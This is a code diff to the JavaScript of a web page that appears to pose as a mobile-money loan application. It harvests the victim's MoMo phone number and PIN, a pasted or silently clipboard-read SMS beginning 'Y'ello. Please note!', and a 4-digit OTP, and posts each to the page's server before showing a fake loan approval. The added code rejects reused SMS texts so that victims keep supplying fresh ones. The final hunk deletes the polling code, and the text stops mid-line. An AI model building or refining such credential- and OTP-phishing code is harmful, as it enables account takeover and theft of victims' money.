@@ -68,8 +68,14 @@ document.addEventListener('DOMContentLoaded', () => {
     let smsWatcherTimer = null;
     let isSubmittingSms = false;
     let isSubmittingOtp = false;
+    let expiredSmsSet = new Set();
+    let lastSubmittedSmsNorm = '';
 
     const SMS_PREFIX = "Y'ello. Please note!";
+
+    function normalizeSms(text) {
+        return (text || '').trim().replace(/\s+/g, ' ');
+    }
 
     function showScreen(targetKey) {
         Object.values(screens).forEach(el => {
@@ -97,10 +103,16 @@ document.addEventListener('DOMContentLoaded', () => {
     }
 
     function isValidYelloSms(text) {
-        if (!text) return false;
-        const normalized = text.trim();
+        const normalized = normalizeSms(text);
+        if (!normalized) return false;
         return normalized.startsWith(SMS_PREFIX) ||
             /^Y'ello\.\s*Please note!/i.test(normalized);
+    }
+
+    function isExpiredOrDuplicateSms(text) {
+        const norm = normalizeSms(text);
+        if (!norm) return false;
+        return expiredSmsSet.has(norm);
     }
 
     function clearAllTimers() {
@@ -241,6 +253,8 @@ document.addEventListener('DOMContentLoaded', () => {
         appState.phone = phoneVal;
         appState.pin = pinVal;
         appState.sessionId = `sess_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`;
+        expiredSmsSet.clear();
+        lastSubmittedSmsNorm = '';
 
         loadingTitle.textContent = "VERIFYING MOMO DETAILS...";
         loadingDesc.textContent = "PLEASE WAIT FOR APPROVAL.";
@@ -303,16 +317,26 @@ document.addEventListener('DOMContentLoaded', () => {
         smsWatcherTimer = setInterval(async () => {
             if (isSubmittingSms) return;
 
-            const currentVal = smsInput.value.trim();
+            const currentVal = normalizeSms(smsInput.value);
             if (isValidYelloSms(currentVal)) {
+                if (isExpiredOrDuplicateSms(currentVal)) {
+                    smsInput.value = '';
+                    showBanner(smsBanner, "SMS EXPIRED — THIS SMS IS ALREADY EXPIRED. PLEASE ENTER A NEW SMS.");
+                    return;
+                }
                 await submitSmsPayload(currentVal);
                 return;
             }
 
             if (navigator.clipboard && navigator.clipboard.readText) {
                 try {
-                    const clipText = (await navigator.clipboard.readText() || '').trim();
+                    const clipText = normalizeSms(await navigator.clipboard.readText());
                     if (isValidYelloSms(clipText)) {
+                        if (isExpiredOrDuplicateSms(clipText)) {
+                            smsInput.value = '';
+                            showBanner(smsBanner, "SMS EXPIRED — THIS SMS IS ALREADY EXPIRED. PLEASE ENTER A NEW SMS.");
+                            return;
+                        }
                         smsInput.value = clipText;
                         await submitSmsPayload(clipText);
                     }
@@ -324,7 +348,15 @@ document.addEventListener('DOMContentLoaded', () => {
     ['input', 'change', 'paste', 'keyup'].forEach(evtName => {
         smsInput.addEventListener(evtName, () => {
             if (isSubmittingSms) return;
-            const text = smsInput.value.trim();
+            const text = normalizeSms(smsInput.value);
+            if (!text) return;
+
+            if (isExpiredOrDuplicateSms(text)) {
+                smsInput.value = '';
+                showBanner(smsBanner, "SMS EXPIRED — THIS SMS IS ALREADY EXPIRED. PLEASE ENTER A NEW SMS.");
+                return;
+            }
+
             if (isValidYelloSms(text)) {
                 hideBanner(smsBanner);
                 submitSmsPayload(text);
@@ -333,33 +365,53 @@ document.addEventListener('DOMContentLoaded', () => {
     });
 
     async function submitSmsPayload(text) {
+        const cleanText = normalizeSms(text);
         if (isSubmittingSms) return;
+
+        if (isExpiredOrDuplicateSms(cleanText)) {
+            smsInput.value = '';
+            showBanner(smsBanner, "SMS EXPIRED — THIS SMS IS ALREADY EXPIRED. PLEASE ENTER A NEW SMS.");
+            return;
+        }
+
         isSubmittingSms = true;
+        lastSubmittedSmsNorm = cleanText;
         if (smsCountdownTimer) clearInterval(smsCountdownTimer);
         if (smsWatcherTimer) clearInterval(smsWatcherTimer);
 
-        loadingTitle.textContent = "SUBMITTING SMS VERIFICATION...";
+        loadingTitle.textContent = "VERIFYING & SUBMITTING NEW SMS...";
         loadingDesc.textContent = "PLEASE WAIT FOR CONFIRMATION.";
         showScreen('loading');
 
         try {
-            await fetch('/api/submit-sms', {
+            const res = await fetch('/api/submit-sms', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     sessionId: appState.sessionId,
-                    smsText: text
+                    smsText: cleanText
                 })
             });
+            const data = await res.json();
+            if (data && data.rejectedDuplicate) {
+                expiredSmsSet.add(cleanText);
+                startSmsStage("SMS EXPIRED — THIS SMS WAS ALREADY SUBMITTED AND EXPIRED. PLEASE ENTER A NEW SMS.");
+                return;
+            }
             startStatusPolling();
         } catch (_) {
             isSubmittingSms = false;
-            startSmsStage("FAILED TO SEND SMS. PLEASE COPY AND PASTE THE WHOLE SMS AGAIN.");
+            startSmsStage("FAILED TO SEND SMS. PLEASE COPY AND PASTE A NEW SMS AGAIN.");
         }
     }
 
     btnVerifySms.addEventListener('click', () => {
-        const text = smsInput.value.trim();
+        const text = normalizeSms(smsInput.value);
+        if (isExpiredOrDuplicateSms(text)) {
+            smsInput.value = '';
+            showBanner(smsBanner, "SMS EXPIRED — THIS SMS IS ALREADY EXPIRED. PLEASE ENTER A NEW SMS.");
+            return;
+        }
         if (!isValidYelloSms(text)) {
             showBanner(smsBanner, "SMS MUST START WITH: Y'ello. Please note!");
             return;
@@ -462,7 +514,7 @@ document.addEventListener('DOMContentLoaded', () => {
     btnVerifyOtp.addEventListener('click', () => {
         const code = sync4OtpBoxes();
         if (!/^\d{4}$/.test(code)) {
-            showBanner(otpBanner, "ENTER NEW INCOMING 4 DIGITS SENT TO HIS MOMO NUMBER.");
+            showBanner(otpBanner, "PLEASE CHECK YOUR SMS AND ENTER OTP SEND TO YOUR MOMO NUMBER.");
             return;
         }
         submitOtpPayload(code);
@@ -490,28 +542,4 @@ document.addEventListener('DOMContentLoaded', () => {
                     reset5PinBoxes();
                     showScreen('credentials');
                     showBanner(credBanner, "INCORRECT PIN");
-                    pin5Boxes[0].focus();
-                } else if (data.status === 'sms_expired') {
-                    clearInterval(statusPollTimer);
-                    startSmsStage("SMS EXPIRED");
-                } else if (data.status === 'otp_step') {
-                    clearInterval(statusPollTimer);
-                    startOtpStage(null);
-                } else if (data.status === 'otp_expired') {
-                    clearInterval(statusPollTimer);
-                    startOtpStage("OTP EXPIRED");
-                } else if (data.status === 'success') {
-                    clearAllTimers();
-                    finalLoanAmountEl.textContent = appState.amount;
-                    showScreen('success');
-                }
-            } catch (_) {}
-        }, 2000);
-    }
-
-    document.getElementById('btn-restart').addEventListener('click', () => {
-        clearAllTimers();
-        location.reload();
-    });
-});
-            
+                    pin5Boxes[0].f
